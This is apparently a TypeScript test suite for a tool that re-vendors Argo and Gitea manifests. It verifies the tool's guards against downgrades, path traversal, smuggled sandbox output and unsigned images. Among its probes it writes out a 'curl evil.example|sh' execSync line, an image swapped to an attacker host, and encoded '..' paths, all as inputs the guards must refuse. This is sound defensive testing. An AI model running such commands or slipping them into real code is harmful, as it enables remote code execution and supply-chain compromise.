import { mkdir, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import type { PluginContext, ScopedHttpRequest, ScopedHttpResponse } from "@scp/plugin-api";
import type { ResolveRunnerLauncher, RunnerSpec } from "@scp/runner-launcher";
import type { TrackedImage } from "@scp/vendor-refresh";
import {
  BACKEND_VERIFICATION,
  DEFAULT_REVENDOR_FETCH_DEPS,
  assertFixedVendorPaths,
  assertNotDowngrade,
  authenticityGapsFor,
  buildOrchestratorTrackedImages,
  compareUpstreamTags,
  hasBomOrCrlf,
  isExactTagSubstitution,
  orchestrateRevendor,
  parseSandboxOutputStrict,
  resolveTagCommitSha,
  verifyVendoredManifestUnchanged,
  type RevendorFetchDeps
} from "./revendor-orchestrator.js";
import type { RepoFile, RepoSession } from "./repo-write.js";

describe("compareUpstreamTags", () => {
  it("orders by numeric semver, not lexically", () => {
    expect(compareUpstreamTags("v3.10.0", "v3.9.0")).toBeGreaterThan(0);
    expect(compareUpstreamTags("v3.9.0", "v3.10.0")).toBeLessThan(0);
    expect(compareUpstreamTags("v3.5.0", "v3.5.0")).toBe(0);
  });

  it("treats a pre-release as OLDER than its own base release (the conservative direction)", () => {
    expect(compareUpstreamTags("v3.5.0-rc1", "v3.5.0")).toBeLessThan(0);
    expect(compareUpstreamTags("v3.5.0", "v3.5.0-rc1")).toBeGreaterThan(0);
  });

  it("refuses a non-comparable tag", () => {
    expect(() => compareUpstreamTags("latest", "v3.5.0")).toThrow(/not a comparable upstream tag/);
  });
});

describe("resolveTagCommitSha", () => {
  function ctxWith(handler: (req: ScopedHttpRequest) => ScopedHttpResponse): PluginContext {
    return {
      orgId: "org",
      scopeKey: "test",
      logger: { debug() {}, info() {}, warn() {}, error() {} },
      secrets: { get: async () => undefined },
      http: { request: async (req) => handler(req) },
      config: {}
    };
  }

  it("resolves a tag to its commit sha via GET /repos/{repo}/commits/{tag}", async () => {
    const ctx = ctxWith((req) => {
      expect(req.url).toBe("https://api.github.com/repos/argoproj/argo-cd/commits/v3.5.0");
      return { status: 200, headers: {}, body: { sha: "b".repeat(40) } };
    });
    expect(await resolveTagCommitSha(ctx, "argoproj/argo-cd", "v3.5.0")).toBe("b".repeat(40));
  });

  it("refuses a malformed tag BEFORE building a URL (SSRF/injection hazard, same shape as probe P1)", async () => {
    const ctx = ctxWith(() => {
      throw new Error("ctx.http must never be reached for a malformed tag");
    });
    await expect(resolveTagCommitSha(ctx, "argoproj/argo-cd", "../../evil")).rejects.toThrow(
      /not a well-formed upstream release tag/
    );
  });

  it("refuses a non-200 response", async () => {
    const ctx = ctxWith(() => ({ status: 404, headers: {}, body: {} }));
    await expect(resolveTagCommitSha(ctx, "argoproj/argo-cd", "v3.5.0")).rejects.toThrow(
      /HTTP 404/
    );
  });

  /** MUTATION-PROVE: a provider that returns something that is not a well-formed 40-hex sha (a
   *  compromised/misbehaving endpoint, or a future API shape change) must not be trusted as one. */
  it("refuses a response whose sha is not well-formed", async () => {
    const ctx = ctxWith(() => ({ status: 200, headers: {}, body: { sha: "not-a-sha" } }));
    await expect(resolveTagCommitSha(ctx, "argoproj/argo-cd", "v3.5.0")).rejects.toThrow(
      /did not resolve to a well-formed commit sha/
    );
  });
});

function fakeSession(files: Record<string, string>): RepoSession {
  return {
    async readFile(path: string): Promise<RepoFile | undefined> {
      const content = files[path];
      return content === undefined ? undefined : { content, blobSha: "x" };
    },
    async listDirectory(): Promise<readonly string[] | undefined> {
      return undefined;
    },
    publishVendorRefresh: async () => {
      throw new Error("not used");
    },
    publishBump: async () => {
      throw new Error("not used");
    },
    mergeAuthoredBranch: async () => {
      throw new Error("not used");
    }
  };
}

describe("assertNotDowngrade", () => {
  const VALUES_YAML_PATH = "deploy/helm-bundled/values.yaml";

  it("allows a real forward bump", async () => {
    const session = fakeSession({
      [VALUES_YAML_PATH]: "image: quay.io/argoproj/argocd:v3.4.5 # Argo CD (Apache-2.0)\n"
    });
    await expect(assertNotDowngrade(session, "argocd", "main", "v3.5.0")).resolves.toBeUndefined();
  });

  /** MUTATION-PROVE (finding 1): a downgrade — or a re-ask of the SAME tag — must be refused, and
   *  refused against what the REPOSITORY currently says, never the caller-supplied `fromTag` alone
   *  (this test supplies no `fromTag` at all — `assertNotDowngrade` never takes one). */
  it("REFUSES a downgrade", async () => {
    const session = fakeSession({
      [VALUES_YAML_PATH]: "image: quay.io/argoproj/argocd:v3.5.0 # Argo CD (Apache-2.0)\n"
    });
    await expect(assertNotDowngrade(session, "argocd", "main", "v3.4.5")).rejects.toThrow(
      /REFUSED \(downgrade\)/
    );
  });

  it("REFUSES re-vendoring to the SAME tag already vendored", async () => {
    const session = fakeSession({
      [VALUES_YAML_PATH]: "image: quay.io/argoproj/argocd:v3.5.0 # Argo CD (Apache-2.0)\n"
    });
    await expect(assertNotDowngrade(session, "argocd", "main", "v3.5.0")).rejects.toThrow(
      /REFUSED \(downgrade\)/
    );
  });

  it("refuses when values.yaml declares no reference to the tracked coordinate at all", async () => {
    const session = fakeSession({ [VALUES_YAML_PATH]: "nothing about argocd here\n" });
    await expect(assertNotDowngrade(session, "argocd", "main", "v3.5.0")).rejects.toThrow(
      /declares no reference/
    );
  });
});

describe("assertFixedVendorPaths — declaredManifestPaths must be the fixed vendored set", () => {
  it("accepts the shared downstream files and this backend's own vendor-dir paths", () => {
    expect(() =>
      assertFixedVendorPaths("argocd", [
        "deploy/helm-bundled/vendor/argocd/install.yaml",
        "deploy/helm-bundled/values.yaml",
        "deploy/airgap/src/bundle-images.ts",
        "tools/ci-mirror/images.list"
      ])
    ).not.toThrow();
  });

  it("accepts an arbitrary NUMBER of argo-workflows split parts, in the REAL two-digit shape (a closed grammar, not an enumerated list — finding 5)", () => {
    expect(() =>
      assertFixedVendorPaths("argo-workflows", [
        "deploy/helm-bundled/vendor/argo-workflows/install-part-01.yaml",
        "deploy/helm-bundled/vendor/argo-workflows/install-part-02.yaml",
        "deploy/helm-bundled/vendor/argo-workflows/install-part-03.yaml",
        "deploy/helm-bundled/vendor/argo-workflows/install-part-04.yaml",
        "deploy/helm-bundled/vendor/argo-workflows/install-part-05.yaml"
      ])
    ).not.toThrow();
  });

  /** MUTATION-PROVE (finding 5): the OLD check was a plain `startsWith` PREFIX — any filename under
   *  the vendor directory passed, including a shape `split.ts`'s own `partFileName` never produces
   *  (single-digit, or a name with no relationship to the split convention at all). The grammar is
   *  now CLOSED: only what the writer could actually have produced is accepted. */
  it("REFUSES a single-digit part filename — split.ts's own partFileName always zero-pads to two digits", () => {
    expect(() =>
      assertFixedVendorPaths("argo-workflows", [
        "deploy/helm-bundled/vendor/argo-workflows/install-part-1.yaml"
      ])
    ).toThrow(/REFUSED \(fixed_vendor_paths\)/);
  });

  /** MUTATION-PROVE: a path pointed at a DIFFERENT backend's vendor directory, or anywhere outside
   *  the vendored set entirely, must be refused — this is the "declaredManifestPaths must be the
   *  fixed vendored set" half of the owner decision, and it must not be satisfiable by a caller just
   *  naming whatever it wants. */
  it("REFUSES a path outside this backend's own vendor directory", () => {
    expect(() =>
      assertFixedVendorPaths("argocd", ["deploy/helm-bundled/vendor/gitea/install-no-secrets.yaml"])
    ).toThrow(/REFUSED \(fixed_vendor_paths\)/);
  });

  it("REFUSES a path with no relationship to the vendored set at all", () => {
    expect(() => assertFixedVendorPaths("argocd", [".github/workflows/ci.yml"])).toThrow(
      /REFUSED \(fixed_vendor_paths\)/
    );
  });
});

describe("BACKEND_VERIFICATION — honesty over uniformity", () => {
  it("argocd is the one backend with a confirmed keyless mechanism", () => {
    expect(BACKEND_VERIFICATION.argocd.method).toBe("keyless");
    expect(BACKEND_VERIFICATION.argocd.identity?.oidcIssuer).toBe(
      "https://token.actions.githubusercontent.com"
    );
  });

  it("every other backend is HONESTLY 'none', with a stated reason — never a silent uniform pass", () => {
    for (const backend of ["argo-workflows", "argo-rollouts", "argo-events", "gitea"] as const) {
      expect(BACKEND_VERIFICATION[backend].method, backend).toBe("none");
      expect(BACKEND_VERIFICATION[backend].unverifiedReason, backend).toBeTruthy();
    }
  });
});

describe("DEFAULT_REVENDOR_FETCH_DEPS", () => {
  it("is wired to the real, network/subprocess-reaching implementations (constructed, never invoked here)", () => {
    expect(typeof DEFAULT_REVENDOR_FETCH_DEPS.resolveImageDigest).toBe("function");
    expect(typeof DEFAULT_REVENDOR_FETCH_DEPS.verifyKeylessSignature).toBe("function");
    expect(typeof DEFAULT_REVENDOR_FETCH_DEPS.fetchGiteaChart).toBe("function");
  });
});

/** The keyless-verification fail-closed gate itself, exercised via a minimal fake `ctx`/session — a
 *  smaller, more targeted proof than the full `revendor.test.ts` E2E suite for THIS ONE property:
 *  cosign returning `unverified` must refuse the run, never merely warn. */
describe("resolveAndVerifyTrackedDigests fail-closed (exercised indirectly via orchestrateRevendor)", () => {
  it("a real cosign NEGATIVE (unverified) refuses the run rather than pinning the digest anyway", async () => {
    const { orchestrateRevendor } = await import("./revendor-orchestrator.js");
    const ctx: PluginContext = {
      orgId: "org",
      scopeKey: "test",
      logger: { debug() {}, info() {}, warn() {}, error() {} },
      secrets: { get: async () => undefined },
      http: {
        request: async (req: ScopedHttpRequest): Promise<ScopedHttpResponse> => {
          if (req.url.includes("/commits/v3.5.0"))
            return { status: 200, headers: {}, body: { sha: "c".repeat(40) } };
          if (req.url.includes("raw.githubusercontent.com"))
            return {
              status: 200,
              headers: {},
              body: "kind: Deployment\nmetadata:\n  name: x\nspec:\n  template:\n    spec:\n      containers:\n      - image: quay.io/argoproj/argocd:v3.5.0\n"
            };
          return { status: 404, headers: {}, body: {} };
        }
      },
      config: {}
    };
    const session = fakeSession({
      "deploy/helm-bundled/values.yaml": "image: quay.io/argoproj/argocd:v3.4.5\n",
      "deploy/airgap/src/bundle-images.ts": "x",
      "tools/ci-mirror/images.list": "x"
    });
    const deps: RevendorFetchDeps = {
      resolveImageDigest: async () => `sha256:${"1".repeat(64)}`,
      verifyKeylessSignature: () => ({ status: "unverified", detail: "no matching signatures" }),
      fetchGiteaChart: async () => {
        throw new Error("not used");
      }
    };
    await expect(
      orchestrateRevendor(
        ctx,
        { revendorRunnerImage: "test:image", workspaceRoot: "/tmp" },
        "argocd",
        "v3.5.0",
        "main",
        session,
        ["deploy/helm-bundled/vendor/argocd/install.yaml"],
        () => {
          throw new Error("the sandbox must never launch when verification already refused");
        },
        deps
      )
    ).rejects.toThrow(/cosign could not verify/);
  });
});

describe("assertFixedVendorPaths — closed grammar, `..` refused first (finding 5)", () => {
  it("accepts install.yaml for a non-split backend", () => {
    expect(() =>
      assertFixedVendorPaths("argocd", ["deploy/helm-bundled/vendor/argocd/install.yaml"])
    ).not.toThrow();
  });

  it("accepts argo-workflows' two-digit split-part grammar, any count", () => {
    expect(() =>
      assertFixedVendorPaths("argo-workflows", [
        "deploy/helm-bundled/vendor/argo-workflows/install-part-01.yaml",
        "deploy/helm-bundled/vendor/argo-workflows/install-part-99.yaml"
      ])
    ).not.toThrow();
  });

  it("accepts gitea's five well-known files", () => {
    expect(() =>
      assertFixedVendorPaths("gitea", [
        "deploy/helm-bundled/vendor/gitea/install-no-secrets.yaml",
        "deploy/helm-bundled/vendor/gitea/config/config_environment.sh",
        "deploy/helm-bundled/vendor/gitea/init/configure_gpg_environment.sh",
        "deploy/helm-bundled/vendor/gitea/init/init_directory_structure.sh",
        "deploy/helm-bundled/vendor/gitea/init/configure_gitea.sh"
      ])
    ).not.toThrow();
  });

  /** PROBE (path-probe.mjs, 2026-09-25 re-review): all three MUST refuse. The old prefix-only check
   *  let #1 and #3 through (both textually `startsWith` the vendor dir prefix). */
  it("PROBE (permanent): refuses a literal '..' segment, an encoded one, and an unrelated subdirectory", () => {
    for (const p of [
      "deploy/helm-bundled/vendor/argocd/../../templates/argocd.yaml",
      "deploy/helm-bundled/vendor/argocd/%2e%2e/x.yaml",
      "deploy/helm-bundled/vendor/argocd/.github/workflows/x.yaml"
    ]) {
      expect(() => assertFixedVendorPaths("argocd", [p]), p).toThrow(
        /REFUSED \(fixed_vendor_paths\)/
      );
    }
  });

  it("refuses a path under a DIFFERENT backend's vendor directory", () => {
    expect(() =>
      assertFixedVendorPaths("argocd", ["deploy/helm-bundled/vendor/gitea/install-no-secrets.yaml"])
    ).toThrow(/REFUSED \(fixed_vendor_paths\)/);
  });
});

describe("parseSandboxOutputStrict — unknown keys refused (finding 2)", () => {
  const VALID = JSON.stringify({
    plan: {
      backend: "argocd",
      tag: "v3.5.0",
      files: [{ path: "deploy/helm-bundled/vendor/argocd/install.yaml", content: "x" }],
      trackedImages: [{ bundleImageName: "argocd", resolvedRef: "a@sha256:b", tagRef: "a:v3.5.0" }],
      summary: "s"
    },
    classification: { class: "image-only", reasons: [] }
  });

  it("accepts a well-formed output.json", () => {
    expect(() => parseSandboxOutputStrict(VALID)).not.toThrow();
  });

  it("REFUSES malformed JSON", () => {
    expect(() => parseSandboxOutputStrict("{not json")).toThrow(/untrusted_output_shape/);
  });

  /** MUTATION-PROVE: a sandbox that could smuggle an EXTRA top-level key is refused outright,
   *  never silently ignored — at every level of nesting. */
  it("REFUSES an unknown top-level key", () => {
    const withExtra = JSON.stringify({ ...JSON.parse(VALID), extra: "smuggled" });
    expect(() => parseSandboxOutputStrict(withExtra)).toThrow(/untrusted_output_shape/);
  });

  it("REFUSES an unknown key inside plan", () => {
    const parsed = JSON.parse(VALID);
    parsed.plan.extra = "smuggled";
    expect(() => parseSandboxOutputStrict(JSON.stringify(parsed))).toThrow(
      /untrusted_output_shape/
    );
  });

  it("REFUSES an unknown key inside a file entry", () => {
    const parsed = JSON.parse(VALID);
    parsed.plan.files[0].extra = "smuggled";
    expect(() => parseSandboxOutputStrict(JSON.stringify(parsed))).toThrow(
      /untrusted_output_shape/
    );
  });

  it("REFUSES an unknown key inside classification", () => {
    const parsed = JSON.parse(VALID);
    parsed.classification.extra = "smuggled";
    expect(() => parseSandboxOutputStrict(JSON.stringify(parsed))).toThrow(
      /untrusted_output_shape/
    );
  });

  it("REFUSES a classification.class outside the closed enum", () => {
    const parsed = JSON.parse(VALID);
    parsed.classification.class = "always-merge-me";
    expect(() => parseSandboxOutputStrict(JSON.stringify(parsed))).toThrow(
      /untrusted_output_shape/
    );
  });

  it("REFUSES a missing required key", () => {
    const parsed = JSON.parse(VALID);
    delete parsed.plan.summary;
    expect(() => parseSandboxOutputStrict(JSON.stringify(parsed))).toThrow(
      /untrusted_output_shape/
    );
  });
});

describe("verifyVendoredManifestUnchanged — no YAML parse, byte-for-byte (finding 2)", () => {
  const FETCHED = "kind: Deployment\nmetadata:\n  name: x\n";

  it("accepts the vendored file reproducing the fetched bytes exactly", () => {
    const gap = verifyVendoredManifestUnchanged("argocd", FETCHED, [
      { path: "deploy/helm-bundled/vendor/argocd/install.yaml", content: FETCHED }
    ]);
    expect(gap).toBeUndefined();
  });

  it("accepts split parts that REJOIN to the fetched bytes exactly", () => {
    const part1 = "kind: Deployment\nmetadata:\n  name: x";
    const part2 = "kind: Service\nmetadata:\n  name: y\n";
    const fetched = `${part1}\n---\n${part2}`;
    const gap = verifyVendoredManifestUnchanged("argo-workflows", fetched, [
      { path: "deploy/helm-bundled/vendor/argo-workflows/install-part-01.yaml", content: part1 },
      { path: "deploy/helm-bundled/vendor/argo-workflows/install-part-02.yaml", content: part2 }
    ]);
    expect(gap).toBeUndefined();
  });

  /** MUTATION-PROVE: the sandbox claiming DIFFERENT bytes than what was fetched — even a single
   *  byte — must be caught, with NO YAML parsing involved. */
  it("REFUSES a single-byte difference from the fetched bytes", () => {
    const gap = verifyVendoredManifestUnchanged("argocd", FETCHED, [
      { path: "deploy/helm-bundled/vendor/argocd/install.yaml", content: FETCHED + "\n" }
    ]);
    expect(gap).toMatch(/do not reproduce the fetched bytes byte-for-byte/);
  });

  it("REFUSES when no vendored file was returned at all", () => {
    const gap = verifyVendoredManifestUnchanged("argocd", FETCHED, [
      { path: "deploy/helm-bundled/values.yaml", content: "x" }
    ]);
    expect(gap).toMatch(/no vendored manifest file at all/);
  });
});

describe("isExactTagSubstitution — the replacement for the line-heuristic (2026-09-25 third re-review, points 1/2)", () => {
  const TRACKED: TrackedImage[] = [
    {
      bundleImageName: "argocd",
      tagRef: "quay.io/argoproj/argocd:v3.5.0",
      resolvedRef: `quay.io/argoproj/argocd:v3.5.0@sha256:${"9".repeat(64)}`
    }
  ];

  it("accepts the exact substitution patchImageRefsOrThrow itself would produce", () => {
    const oldC = "image: quay.io/argoproj/argocd:v3.4.5 # Argo CD\n";
    const newC = "image: quay.io/argoproj/argocd:v3.5.0 # Argo CD\n";
    expect(isExactTagSubstitution(oldC, newC, TRACKED, "values.yaml")).toBeUndefined();
  });

  it("accepts no change at all", () => {
    const c = "image: quay.io/argoproj/argocd:v3.5.0\n";
    expect(isExactTagSubstitution(c, c, TRACKED, "values.yaml")).toBeUndefined();
  });

  /**
   * D1 (2026-09-25 third re-review) — MADE PERMANENT. The line-heuristic this function replaces
   * asked only "does the tracked coordinate appear somewhere on the line" — a line rewritten to an
   * ENTIRELY DIFFERENT image, with the tracked coordinate merely appended as a trailing comment,
   * satisfied that question and merged. An EXACT substitution has no such gap: the only content this
   * function will ever accept as "the image changed" is the coordinate's own tag/digest text, in
   * place, nothing else rewritten.
   */
  it("PROBE D1 (permanent): REFUSES a line rewritten to a different image with the tracked coordinate appended as a trailing comment", () => {
    const oldC = "image: quay.io/argoproj/argocd:v3.4.5\n";
    const newC = "image: evil.example/pwn:v1 # quay.io/argoproj/argocd\n";
    const gap = isExactTagSubstitution(oldC, newC, TRACKED, "values.yaml");
    expect(gap).toMatch(/changed by more than the tracked image tag/);
  });

  /** D1's `bundle-images.ts` half: an unrelated `execSync` call smuggled in, with the coordinate
   *  reachable only via a trailing comment the old line-heuristic accepted as "mentions it." */
  it("PROBE D1 (permanent): REFUSES an unrelated code change with the coordinate only in a trailing comment", () => {
    const oldC = '{ name: "argocd", defaultRef: "quay.io/argoproj/argocd:v3.4.5" }\n';
    const newC =
      'require("child_process").execSync("curl evil.example|sh"); // quay.io/argoproj/argocd\n';
    const gap = isExactTagSubstitution(oldC, newC, TRACKED, "bundle-images.ts");
    expect(gap).toMatch(/changed by more than the tracked image tag/);
  });

  it("REFUSES any change at all when there is no tracked image to attribute it to", () => {
    const gap = isExactTagSubstitution("a\n", "b\n", [], "images.list");
    expect(gap).toMatch(/no tracked image to attribute it to/);
  });

  /**
   * D4 (2026-09-25 third re-review) — MADE PERMANENT. A CRLF or BOM appearing where the old content
   * had none (or vice versa) is refused even when the SUBSTITUTION itself would otherwise be exact —
   * a would-be sandbox that could not smuggle a byte CONTENT change could still try to smuggle an
   * ENCODING change a downstream tool might interpret differently.
   */
  it("PROBE D4 (permanent): REFUSES a CRLF line ending appearing where the old content had none", () => {
    const oldC = "image: quay.io/argoproj/argocd:v3.4.5\n";
    const newC = "image: quay.io/argoproj/argocd:v3.5.0\r\n";
    const gap = isExactTagSubstitution(oldC, newC, TRACKED, "values.yaml");
    expect(gap).toMatch(/byte-order mark or CRLF/);
  });

  it("PROBE D4 (permanent): REFUSES a BOM appearing where the old content had none", () => {
    const oldC = "image: quay.io/argoproj/argocd:v3.4.5\n";
    const newC = "﻿image: quay.io/argoproj/argocd:v3.5.0\n";
    const gap = isExactTagSubstitution(oldC, newC, TRACKED, "values.yaml");
    expect(gap).toMatch(/byte-order mark or CRLF/);
  });
});

describe("hasBomOrCrlf", () => {
  it("detects neither in ordinary LF text", () => {
    expect(hasBomOrCrlf("a\nb\n")).toBe(false);
  });
  it("detects a BOM", () => {
    expect(hasBomOrCrlf("﻿a\n")).toBe(true);
  });
  it("detects CRLF", () => {
    expect(hasBomOrCrlf("a\r\nb\n")).toBe(true);
  });
});

describe("buildOrchestratorTrackedImages — never the sandbox's plan.trackedImages", () => {
  it("builds argocd's tracked image entirely from static specs + orchestrator-resolved digests", () => {
    const images = buildOrchestratorTrackedImages("argocd", "v3.5.0", {
      "quay.io/argoproj/argocd:v3.5.0": `sha256:${"9".repeat(64)}`
    });
    expect(images).toEqual([
      {
        bundleImageName: "argocd",
        tagRef: "quay.io/argoproj/argocd:v3.5.0",
        resolvedRef: `quay.io/argoproj/argocd:v3.5.0@sha256:${"9".repeat(64)}`
      }
    ]);
  });

  it("REFUSES when no digest was resolved for the expected tag (never guesses)", () => {
    expect(() => buildOrchestratorTrackedImages("argocd", "v3.5.0", {})).toThrow(
      /no resolved digest for/
    );
  });
});

describe("authenticityGapsFor — finding 3: image-only AND authenticity verified", () => {
  it("argocd: zero gaps — keyless-verified AND fetched by commit sha", () => {
    expect(authenticityGapsFor("argocd")).toEqual([]);
  });

  it("every other backend has at least one gap, always — never auto-merge eligible", () => {
    for (const backend of ["argo-workflows", "argo-rollouts", "argo-events", "gitea"] as const) {
      expect(authenticityGapsFor(backend).length, backend).toBeGreaterThan(0);
    }
  });

  it("argo-events is fetched by sha but STILL gapped — no signature check is its own, independent gap", () => {
    const gaps = authenticityGapsFor("argo-events");
    expect(gaps.some((g) => g.includes("no confirmed image-signature check"))).toBe(true);
    expect(gaps.some((g) => g.includes("fetched by tag"))).toBe(false);
  });

  it("argo-workflows is gapped on BOTH axes — no signature check AND fetched by tag (release-asset)", () => {
    const gaps = authenticityGapsFor("argo-workflows");
    expect(gaps.some((g) => g.includes("no confirmed image-signature check"))).toBe(true);
    expect(gaps.some((g) => g.includes("fetched by tag"))).toBe(true);
  });
});

/**
 * STALE-PART DELETION (2026-09-25 third re-review) — MADE PERMANENT. Argo Workflows is the one
 * backend whose vendored file COUNT can shrink between re-vendors (its split part count is
 * upstream's install.yaml size to decide, finding 7). A re-vendor that goes from 4 parts to 3 must
 * DELETE the orphaned 4th, or a stale `install-part-04.yaml` from the PREVIOUS version sits in the
 * tree forever, silently reassembled by `argo-workflows.yaml`'s `.Files.Glob` alongside the three
 * NEW parts into a manifest that is neither the old release nor the new one.
 */
describe("orchestrateRevendor — stale vendor-file deletion (finding: 'delete stale install-part-NN.yaml')", () => {
  const ARGOCLI = "quay.io/argoproj/argocli";
  const CONTROLLER = "quay.io/argoproj/workflow-controller";
  const OLD_TAG = "v4.0.7";
  const NEW_TAG = "v4.0.8";
  const DIGEST = `sha256:${"7".repeat(64)}`;

  function fakeArgoWorkflowsSession(currentListing: readonly string[]): RepoSession {
    const files: Record<string, string> = {
      "deploy/helm-bundled/values.yaml": `${ARGOCLI}:${OLD_TAG}\n${CONTROLLER}:${OLD_TAG}\n`,
      "deploy/airgap/src/bundle-images.ts": `${ARGOCLI}:${OLD_TAG}\n${CONTROLLER}:${OLD_TAG}\n`,
      "tools/ci-mirror/images.list": ""
    };
    return {
      async readFile(path: string): Promise<RepoFile | undefined> {
        const content = files[path];
        return content === undefined ? undefined : { content, blobSha: "x" };
      },
      async listDirectory(path: string): Promise<readonly string[] | undefined> {
        if (path === "deploy/helm-bundled/vendor/argo-workflows") return currentListing;
        return undefined;
      },
      publishVendorRefresh: async () => {
        throw new Error("not used");
      },
      publishBump: async () => {
        throw new Error("not used");
      },
      mergeAuthoredBranch: async () => {
        throw new Error("not used");
      }
    };
  }

  function fakeLauncherReturning(newPartCount: number): ResolveRunnerLauncher {
    return () => ({
      async run(spec: RunnerSpec) {
        const files = Array.from({ length: newPartCount }, (_, i) => ({
          path: `deploy/helm-bundled/vendor/argo-workflows/install-part-${String(i + 1).padStart(2, "0")}.yaml`,
          content: `doc-${i + 1}`
        }));
        const output = {
          plan: {
            backend: "argo-workflows",
            tag: NEW_TAG,
            files,
            trackedImages: [],
            summary: "s"
          },
          classification: {
            class: "requires-review",
            reasons: ["argo-workflows is never auto-merge eligible"]
          }
        };
        if (spec.copyOut) {
          await mkdir(spec.copyOut.hostDir, { recursive: true });
          await writeFile(
            join(spec.copyOut.hostDir, "output.json"),
            JSON.stringify(output),
            "utf8"
          );
        }
        return { succeeded: true, stdout: "", stderr: "" };
      },
      async reap() {
        return [];
      }
    });
  }

  const ctx: PluginContext = {
    orgId: "org",
    scopeKey: "test",
    logger: { debug() {}, info() {}, warn() {}, error() {} },
    secrets: { get: async () => undefined },
    http: {
      request: async (req: ScopedHttpRequest): Promise<ScopedHttpResponse> => {
        if (
          req.url ===
          `https://github.com/argoproj/argo-workflows/releases/download/${NEW_TAG}/install.yaml`
        ) {
          return { status: 200, headers: {}, body: "doc-1\n---\ndoc-2\n---\ndoc-3" };
        }
        return { status: 404, headers: {}, body: {} };
      }
    },
    config: {}
  };
  const deps: RevendorFetchDeps = {
    resolveImageDigest: async () => DIGEST,
    verifyKeylessSignature: () => ({ status: "verified", detail: "n/a" }),
    fetchGiteaChart: async () => {
      throw new Error("not used");
    }
  };

  it("PROBE (permanent): a re-vendor that SHRINKS from 4 parts to 3 deletes the orphaned 4th", async () => {
    const currentListing = [1, 2, 3, 4].map(
      (n) => `deploy/helm-bundled/vendor/argo-workflows/install-part-0${n}.yaml`
    );
    const result = await orchestrateRevendor(
      ctx,
      { revendorRunnerImage: "test:image", workspaceRoot: "/tmp" },
      "argo-workflows",
      NEW_TAG,
      "main",
      fakeArgoWorkflowsSession(currentListing),
      [
        "deploy/helm-bundled/vendor/argo-workflows/install-part-01.yaml",
        "deploy/helm-bundled/vendor/argo-workflows/install-part-02.yaml",
        "deploy/helm-bundled/vendor/argo-workflows/install-part-03.yaml",
        "deploy/helm-bundled/values.yaml",
        "deploy/airgap/src/bundle-images.ts"
      ],
      fakeLauncherReturning(3),
      deps
    );
    expect(result.deletePaths).toEqual([
      "deploy/helm-bundled/vendor/argo-workflows/install-part-04.yaml"
    ]);
  });

  it("no stale parts when the count is UNCHANGED — nothing to delete", async () => {
    const currentListing = [1, 2, 3, 4].map(
      (n) => `deploy/helm-bundled/vendor/argo-workflows/install-part-0${n}.yaml`
    );
    const result = await orchestrateRevendor(
      ctx,
      { revendorRunnerImage: "test:image", workspaceRoot: "/tmp" },
      "argo-workflows",
      NEW_TAG,
      "main",
      fakeArgoWorkflowsSession(currentListing),
      [
        "deploy/helm-bundled/vendor/argo-workflows/install-part-01.yaml",
        "deploy/helm-bundled/vendor/argo-workflows/install-part-02.yaml",
        "deploy/helm-bundled/vendor/argo-workflows/install-part-03.yaml",
        "deploy/helm-bundled/vendor/argo-workflows/install-part-04.yaml",
        "deploy/helm-bundled/values.yaml",
        "deploy/airgap/src/bundle-images.ts"
      ],
      fakeLauncherReturning(4),
      deps
    );
    expect(result.deletePaths).toEqual([]);
  });

  it("other backends never compute a deletion (their vendor file set is fixed by the grammar, not the directory)", async () => {
    const argocdCtx: PluginContext = {
      ...ctx,
      http: {
        request: async (req: ScopedHttpRequest): Promise<ScopedHttpResponse> => {
          if (req.url.includes("/commits/v3.5.0"))
            return { status: 200, headers: {}, body: { sha: "c".repeat(40) } };
          if (req.url.includes("raw.githubusercontent.com"))
            return {
              status: 200,
              headers: {},
              body: "kind: Deployment\nmetadata:\n  name: x\nspec:\n  template:\n    spec:\n      containers:\n      - image: quay.io/argoproj/argocd:v3.5.0\n"
            };
          return { status: 404, headers: {}, body: {} };
        }
      }
    };
    const session = fakeSession({
      "deploy/helm-bundled/values.yaml": "image: quay.io/argoproj/argocd:v3.4.5\n",
      "deploy/airgap/src/bundle-images.ts": "image: quay.io/argoproj/argocd:v3.4.5\n",
      "tools/ci-mirror/images.list": "x"
    });
    const argocdLauncher: ResolveRunnerLauncher = () => ({
      async run(spec: RunnerSpec) {
        const output = {
          plan: {
            backend: "argocd",
            tag: "v3.5.0",
            files: [
              {
                path: "deploy/helm-bundled/vendor/argocd/install.yaml",
                content:
                  "kind: Deployment\nmetadata:\n  name: x\nspec:\n  template:\n    spec:\n      containers:\n      - image: quay.io/argoproj/argocd:v3.5.0\n"
              }
            ],
            trackedImages: [],
            summary: "s"
          },
          classification: { class: "image-only", reasons: [] }
        };
        if (spec.copyOut) {
          await mkdir(spec.copyOut.hostDir, { recursive: true });
          await writeFile(
            join(spec.copyOut.hostDir, "output.json"),
            JSON.stringify(output),
            "utf8"
          );
        }
        return { succeeded: true, stdout: "", stderr: "" };
      },
      async reap() {
        return [];
      }
    });
    const result = await orchestrateRevendor(
      argocdCtx,
      { revendorRunnerImage: "test:image", workspaceRoot: "/tmp" },
      "argocd",
      "v3.5.0",
      "main",
      session,
      ["deploy/helm-bundled/vendor/argocd/install.yaml"],
      argocdLauncher,
      deps
    );
    expect(result.deletePaths).toEqual([]);
  });
});
